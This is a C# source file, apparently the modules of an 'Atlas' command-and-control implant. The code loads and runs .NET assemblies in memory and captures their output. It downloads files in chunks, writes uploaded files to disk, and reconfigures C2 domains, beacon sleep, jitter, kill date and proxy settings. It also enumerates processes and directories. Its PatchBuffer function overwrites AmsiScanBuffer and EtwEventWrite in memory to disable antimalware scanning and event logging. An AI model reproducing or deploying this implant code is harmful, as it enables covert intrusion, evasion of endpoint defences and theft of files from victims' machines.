using System;
using System.Text;
using System.Reflection;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Atlas
{
    class Modules
    {
        public static bool Check(string FileId)
        {
            try
            {
                bool a = Config.Modules.ContainsKey(FileId);
                return a;
            }
            catch
            {
                return false;
            }
        }

        public static string GetFullName(string FileId)
        {
            try
            {
                if (Check(FileId))
                {
                    string FullName = Config.Modules[FileId];
                    return FullName;
                }
                else
                {
                    return "";
                }
            }
            catch
            {
                return "";
            }
        }

        public static string ListAssemblies()
        {
            string AssemblyList = "";
            try
            {
                foreach (KeyValuePair<string, string> Entry in Config.Modules)
                {
                    string Module = Encoding.UTF8.GetString(Convert.FromBase64String(Entry.Value));
                    string[] Assembly = Module.Split(',');
                    AssemblyList += Assembly[0] + '\n';
                }
                return AssemblyList;
            }
            catch
            {
                return AssemblyList = "";
            }
        }

        public static bool Load(string FileId, string B64Assembly)
        {
            try
            {
                if (Check(FileId))
                {
                    return false;
                }
                else
                {
                    var a = Assembly.Load(Convert.FromBase64String(B64Assembly));
                    string fullname = Convert.ToBase64String(Encoding.UTF8.GetBytes(a.FullName));
                    Config.Modules.Add(FileId, fullname);
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        public static string Invoke(string FileId, string[] args)
        {
            string output = "";
            try
            {
                string FullName = GetFullName(FileId);
                Assembly[] assems = AppDomain.CurrentDomain.GetAssemblies();
                foreach (Assembly assem in assems)
                {
                    if (assem.FullName == Encoding.UTF8.GetString(Convert.FromBase64String(FullName)))
                    {
                        MethodInfo entrypoint = assem.EntryPoint;
                        object[] arg = new object[] { args };

                        TextWriter realStdOut = Console.Out;
                        TextWriter realStdErr = Console.Error;
                        TextWriter stdOutWriter = new StringWriter();
                        TextWriter stdErrWriter = new StringWriter();
                        Console.SetOut(stdOutWriter);
                        Console.SetError(stdErrWriter);

                        entrypoint.Invoke(null, arg);

                        Console.Out.Flush();
                        Console.Error.Flush();
                        Console.SetOut(realStdOut);
                        Console.SetError(realStdErr);

                        output = stdOutWriter.ToString();
                        output += stdErrWriter.ToString();
                        break;
                    }
                }
                return output;
            }
            catch
            {
                return output;
            }
        }

        public static byte[] GetAssembly(List<string> Chunks, int TotalChunks)
        {
            byte[] FinalAssembly = new byte[] { };
            try
            {
                byte[][] AssemblyArray = new byte[TotalChunks][];
                foreach (string chunk in Chunks)
                {
                    int index = Chunks.IndexOf(chunk);
                    AssemblyArray[index] = Convert.FromBase64String(chunk);
                }
                FinalAssembly = Combine(AssemblyArray);
                return FinalAssembly;
            }
            catch
            {
                return FinalAssembly;
            }
        }

        public static byte[] Combine(params byte[][] arrays)
        {
            byte[] rv = new byte[arrays.Sum(a => a.Length)];
            int offset = 0;
            foreach (byte[] array in arrays)
            {
                Buffer.BlockCopy(array, 0, rv, offset, array.Length);
                offset += array.Length;
            }
            return rv;
        }

        public static class Download
        {
            public static ulong GetTotalChunks(string File)
            {
                var fi = new FileInfo(File);
                ulong total_chunks = (ulong)(fi.Length + Config.ChunkSize - 1) / (ulong)Config.ChunkSize;
                return total_chunks;
            }

            public static long GetFileSize(string File)
            {
                var fi = new FileInfo(File);
                return fi.Length;
            }

            public static string GetPath(string File)
            {
                return Path.GetFullPath(File);
            }

            public static string GetChunk(string File, int ChunkNum, int TotalChunks, long FileSize)
            {
                try
                {
                    byte[] file_chunk = null;
                    long pos = ChunkNum * Config.ChunkSize;
                    using (FileStream fileStream = new FileStream(File, FileMode.Open))
                    {
                        fileStream.Position = pos;
                        if (TotalChunks == ChunkNum + 1)
                        {
                            file_chunk = new byte[FileSize - (ChunkNum * Config.ChunkSize)];
                            int chunk_size = file_chunk.Length;
                            fileStream.Read(file_chunk, 0, chunk_size);
                        }
                        else
                        {
                            file_chunk = new byte[Config.ChunkSize];
                            fileStream.Read(file_chunk, 0, Config.ChunkSize);
                        }
                    }
                    return Convert.ToBase64String(file_chunk);
                }
                catch
                {
                    return "Error reading file";
                }
            }
        }

        public static bool Upload(string File, string ChunkData)
        {
            try
            {
                byte[] chunk_data = Convert.FromBase64String(ChunkData);
                using (FileStream fileStream = new FileStream(File, FileMode.Append))
                {
                    fileStream.Write(chunk_data, 0, chunk_data.Length);
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool SetConfig(string arg)
        {
            string[] args = arg.Split();
            try
            {
                switch (args[0].ToString())
                {
                    case "domain":
                        if (args[1] == "add")
                        {
                            Utils.Server server = new Utils.Server
                            {
                                domain = args[2],
                                count = 0
                            };
                            Config.Servers.Add(server);
                            break;
                        }
                        else if (args[1] == "remove")
                        {
                            if (Config.Servers.Count == 1)
                            {
                                break;
                            }
                            else
                            {
                                foreach (Utils.Server server in Config.Servers)
                                {
                                    if (server.domain == args[2])
                                    {
                                        Config.Servers.Remove(server);
                                    }
                                }
                                break;
                            }
                        }
                        else
                        {
                            break;
                        }
                    case "sleep":
                        Config.Sleep = int.Parse(args[1]);
                        break;
                    case "jitter":
                        Config.Jitter = int.Parse(args[1]);
                        break;
                    case "kill_date":
                        Config.KillDate = args[1];
                        break;
                    case "host_header":
                        Config.HostHeader = args[1];
                        break;
                    case "user_agent":
                        string ua = string.Join(" ", args);
                        Config.UserAgent = ua.Substring(11);
                        break;
                    case "param":
                        Config.Param = args[1];
                        break;
                    case "proxy":
                        switch (args[1])
                        {
                            case "use_default":
                                if (args[2].ToLower() == "false")
                                {
                                    Config.DefaultProxy = false;
                                }
                                else
                                {
                                    Config.DefaultProxy = true;
                                }
                                break;
                            case "address":
                                Config.ProxyAddress = args[2];
                                break;
                            case "username":
                                Config.ProxyUser = args[2];
                                break;
                            case "password":
                                Config.ProxyPassword = args[2];
                                break;
                            default:
                                return false;
                        }
                        break;
                    default:
                        return false;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static bool PatchBuffer()
        {
#if NET_4 
            byte[] patch;
            if (IntPtr.Size == 8)
            {
                patch = new byte[6];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc3;
            }
            else
            {
                patch = new byte[8];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc2;
                patch[6] = 0x18;
                patch[7] = 0x00;
            }
#endif
            byte[] nPatch;
            if (IntPtr.Size == 8)
            {
                nPatch = new byte[] { 0xc3, 0x00 };
            }
            else
            {
                nPatch = new byte[] { 0xc2, 0x14, 0x00 };
            }

            try
            {
#if NET_4
                var library = LoadLibrary("amsi.dll");
                var address = GetProcAddress(library, "AmsiScanBuffer");
                uint oldProtect;
                VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, address, patch.Length);
                VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
#endif
                uint nOldProtect;
                // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
                var ntdll = LoadLibrary("ntdll.dll");
                var etwEventSend = GetProcAddress(ntdll, "EtwEventWrite");
                VirtualProtect(etwEventSend, (UIntPtr)nPatch.Length, 0x40, out nOldProtect);
                Marshal.Copy(nPatch, 0, etwEventSend, nPatch.Length);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static string GetConnectFails()
        {
            string attempts = "";
            foreach (Utils.Server server in Config.Servers)
            {
                attempts += String.Format("{0} = {1}, ", server.domain, server.count.ToString());
            }
            return attempts;
        }

        public static string GetConfig()
        {
            string servers = "";
            foreach (Utils.Server server in Config.Servers)
            {
                servers += String.Format("{0} ", server.domain);
            }
            return String.Format("Domains: {0}\nSleep: {1}\nJitter: {2}\nKill Date: {3}\nHost Header: {4}\nUser-Agent: {5}\nGET Parameter: {6}\nUse Default Proxy: {7}\nProxy Address: {8}\nProxy Username: {9}\nProxy Password: {10}\nFailed Connections: {11}", servers, Config.Sleep.ToString(), Config.Jitter.ToString(), Config.KillDate, Config.HostHeader, Config.UserAgent, Config.Param, Config.DefaultProxy, Config.ProxyAddress, Config.ProxyUser, Config.ProxyPassword, GetConnectFails());
        }

        public static bool KillJob(Utils.JobList jobList, int jobNum)
        {
            try
            {
                int count = 0;
                foreach (Utils.Job job in jobList.jobs)
                {
                    if (job.job_id == jobNum)
                    {
                        jobList.jobs[jobNum].thread.Abort();
                        jobList.jobs.RemoveAt(count);
                        break;
                    }
                    count++;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static string GetJobs(Utils.JobList jobList)
        {
            string jobs = "Job ID\tTask ID\t\t\t\t\tCommand\t\tParameters\n------\t-------\t\t\t\t\t-------\t\t---------\n";
            foreach (Utils.Job job in jobList.jobs)
            {
                jobs += String.Format("{0}\t{1}\t{2}\t\t{3}\n", job.job_id, job.task_id, job.command, job.parameters.Replace(@"\", @""));
            }
            return jobs;
        }

        // Most of this code is directly from SharSploit: https://github.com/cobbr/SharpSploit
        public class ProcessList
        {
            private struct PROCESS_BASIC_INFORMATION
            {
                private IntPtr ExitStatus;
                private IntPtr PebBaseAddress;
                private IntPtr AffinityMask;
                private IntPtr BasePriority;
                private UIntPtr UniqueProcessId;
                public int InheritedFromUniqueProcessId;

                private int Size
                {
                    get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
                }
            }

            private enum PROCESSINFOCLASS : int
            {
                ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
                ProcessQuotaLimits, // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX
                ProcessIoCounters, // q: IO_COUNTERS
                ProcessVmCounters, // q: VM_COUNTERS, VM_COUNTERS_EX
                ProcessTimes, // q: KERNEL_USER_TIMES
                ProcessBasePriority, // s: KPRIORITY
                ProcessRaisePriority, // s: ULONG
                ProcessDebugPort, // q: HANDLE
                ProcessExceptionPort, // s: HANDLE
                ProcessAccessToken, // s: PROCESS_ACCESS_TOKEN
                ProcessLdtInformation, // 10
                ProcessLdtSize,
                ProcessDefaultHardErrorMode, // qs: ULONG
                ProcessIoPortHandlers, // (kernel-mode only)
                ProcessPooledUsageAndLimits, // q: POOLED_USAGE_AND_LIMITS
                ProcessWorkingSetWatch, // q: PROCESS_WS_WATCH_INFORMATION[]; s: void
                ProcessUserModeIOPL,
                ProcessEnableAlignmentFaultFixup, // s: BOOLEAN
                ProcessPriorityClass, // qs: PROCESS_PRIORITY_CLASS
                ProcessWx86Information,
                ProcessHandleCount, // 20, q: ULONG, PROCESS_HANDLE_INFORMATION
                ProcessAffinityMask, // s: KAFFINITY
                ProcessPriorityBoost, // qs: ULONG
                ProcessDeviceMap, // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX
                ProcessSessionInformation, // q: PROCESS_SESSION_INFORMATION
                ProcessForegroundInformation, // s: PROCESS_FOREGROUND_BACKGROUND
                ProcessWow64Information, // q: ULONG_PTR
                ProcessImageFileName, // q: UNICODE_STRING
                ProcessLUIDDeviceMapsEnabled, // q: ULONG
                ProcessBreakOnTermination, // qs: ULONG
                ProcessDebugObjectHandle, // 30, q: HANDLE
                ProcessDebugFlags, // qs: ULONG
                ProcessHandleTracing, // q: PROCESS_HANDLE_TRACING_QUERY; s: size 0 disables, otherwise enables
                ProcessIoPriority, // qs: ULONG
                ProcessExecuteFlags, // qs: ULONG
                ProcessResourceManagement,
                ProcessCookie, // q: ULONG
                ProcessImageInformation, // q: SECTION_IMAGE_INFORMATION
                ProcessCycleTime, // q: PROCESS_CYCLE_TIME_INFORMATION
                ProcessPagePriority, // q: ULONG
                ProcessInstrumentationCallback, // 40
                ProcessThreadStackAllocation, // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX
                ProcessWorkingSetWatchEx, // q: PROCESS_WS_WATCH_INFORMATION_EX[]
                ProcessImageFileNameWin32, // q: UNICODE_STRING
                ProcessImageFileMapping, // q: HANDLE (input)
                ProcessAffinityUpdateMode, // qs: PROCESS_AFFINITY_UPDATE_MODE
                ProcessMemoryAllocationMode, // qs: PROCESS_MEMORY_ALLOCATION_MODE
                ProcessGroupInformation, // q: USHORT[]
                ProcessTokenVirtualizationEnabled, // s: ULONG
                ProcessConsoleHostProcess, // q: ULONG_PTR
                ProcessWindowInformation, // 50, q: PROCESS_WINDOW_INFORMATION
                ProcessHandleInformation, // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8
                ProcessMitigationPolicy, // s: PROCESS_MITIGATION_POLICY_INFORMATION
                ProcessDynamicFunctionTableInformation,
                ProcessHandleCheckingMode,
                ProcessKeepAliveCount, // q: PROCESS_KEEPALIVE_COUNT_INFORMATION
                ProcessRevokeFileHandles, // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION
                MaxProcessInfoClass
            };

            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern int NtQueryInformationProcess(IntPtr hProcess, PROCESSINFOCLASS pic, IntPtr pi, int cb, out int pSize);

            public static int GetParentProcess(IntPtr Handle)
            {
                int returnLength;
                var basicProcessInformation = new PROCESS_BASIC_INFORMATION();
                IntPtr pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(basicProcessInformation));
                Marshal.StructureToPtr(basicProcessInformation, pProcInfo, true);
                NtQueryInformationProcess(Handle, PROCESSINFOCLASS.ProcessBasicInformation, pProcInfo, Marshal.SizeOf(basicProcessInformation), out returnLength);
                basicProcessInformation = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(PROCESS_BASIC_INFORMATION));

                return basicProcessInformation.InheritedFromUniqueProcessId;
            }

            [DllImport("kernel32.dll")]
            private static extern Boolean OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken);

            private static string GetProcessOwner(Process Process)
            {
                try
                {
                    IntPtr handle;
                    OpenProcessToken(Process.Handle, 8, out handle);
                    using (var winIdentity = new System.Security.Principal.WindowsIdentity(handle))
                    {
                        return winIdentity.Name;
                    }
                }
                catch (InvalidOperationException)
                {
                    return string.Empty;
                }
                catch (System.ComponentModel.Win32Exception)
                {
                    return string.Empty;
                }
            }

            private struct SYSTEM_INFO
            {
                public ushort wProcessorArchitecture;
                private ushort wReserved;
                private uint dwPageSize;
                private IntPtr lpMinimumApplicationAddress;
                private IntPtr lpMaximumApplicationAddress;
                private UIntPtr dwActiveProcessorMask;
                private uint dwNumberOfProcessors;
                private uint dwProcessorType;
                private uint dwAllocationGranularity;
                private ushort wProcessorLevel;
                private ushort wProcessorRevision;
            };

            private enum Platform
            {
                x86,
                x64,
                IA64,
                Unknown
            }

            [DllImport("kernel32.dll")]
            private static extern void GetNativeSystemInfo(ref SYSTEM_INFO lpSystemInfo);

            private static Platform GetArchitecture()
            {
                const ushort PROCESSOR_ARCHITECTURE_INTEL = 0;
                const ushort PROCESSOR_ARCHITECTURE_IA64 = 6;
                const ushort PROCESSOR_ARCHITECTURE_AMD64 = 9;

                var sysInfo = new SYSTEM_INFO();
                GetNativeSystemInfo(ref sysInfo);

                switch (sysInfo.wProcessorArchitecture)
                {
                    case PROCESSOR_ARCHITECTURE_AMD64:
                        return Platform.x64;
                    case PROCESSOR_ARCHITECTURE_INTEL:
                        return Platform.x86;
                    case PROCESSOR_ARCHITECTURE_IA64:
                        return Platform.IA64;
                    default:
                        return Platform.Unknown;
                }
            }

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);

            private static bool IsWow64(Process Process)
            {
                try
                {
                    bool isWow64;
                    IsWow64Process(Process.Handle, out isWow64);
                    return isWow64;
                }
                catch (InvalidOperationException)
                {
                    return false;
                }
                catch (System.ComponentModel.Win32Exception)
                {
                    return false;
                }
            }

            private static int GetParentProcess(Process Process)
            {
                try
                {
                    return GetParentProcess(Process.Handle);
                }
                catch (InvalidOperationException)
                {
                    return 0;
                }
                catch (System.ComponentModel.Win32Exception)
                {
                    return 0;
                }
            }

            public static Utils.ProcessList GetProcessList()
            {
                Utils.ProcessList process_list = new Utils.ProcessList { };
                try
                {
                    var processorArchitecture = GetArchitecture();
                    Process[] processes = Process.GetProcesses().OrderBy(P => P.Id).ToArray();
                    foreach (Process process in processes)
                    {
                        Utils.Process process_info = new Utils.Process
                        {
                            process_id = process.Id,
                            parent_process_id = GetParentProcess(process),
                            name = process.ProcessName,
                            bin_path = string.Empty,
                            user = GetProcessOwner(process)
                        };

                        if (process_info.parent_process_id != 0)
                        {
                            try
                            {
                                process_info.bin_path = process.MainModule.FileName;
                            }
                            catch (System.ComponentModel.Win32Exception) { }
                        }

                        if (processorArchitecture == Platform.x64)
                        {
                            process_info.architecture = "x64";
                        }
                        else
                        {
                            process_info.architecture = "x86";
                        }
                        process_list.process_list.Add(process_info);
                    }
                    return process_list;
                }
                catch
                {
                    return process_list;
                }
            }
        }

        // Most of this code is directly from SharSploit: https://github.com/cobbr/SharpSploit
        public static Utils.DirectoryList DirectoryListing(string Path)
        {
            Utils.DirectoryList results = new Utils.DirectoryList();
            if (File.Exists(Path))
            {
                FileInfo fileInfo = new FileInfo(Path);
                results.directory_list.Add(new Utils.FileSystemEntry
                {
                    file_name = fileInfo.FullName,
                    size = (int)fileInfo.Length,
                    timestamp = fileInfo.LastWriteTimeUtc.ToString(),
                    IsDir = "false"
                });
            }
            else
            {
                foreach (string dir in Directory.GetDirectories(Path))
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(dir);
                    results.directory_list.Add(new Utils.FileSystemEntry
                    {
                        file_name = dirInfo.FullName,
                        size = 0,
                        timestamp = dirInfo.LastWriteTimeUtc.ToString(),
                        IsDir = "true"
                    });
                }
                foreach (string file in Directory.GetFiles(Path))
                {
                    FileInfo fileInfo = new FileInfo(file);
                    results.directory_list.Add(new Utils.FileSystemEntry
                    {
                        file_name = fileInfo.FullName,
                        size = (int)fileInfo.Length,
                        timestamp = fileInfo.LastWriteTimeUtc.ToString(),
                        IsDir = "false"
                    });
                }
            }
            return results;
        }
    }
}
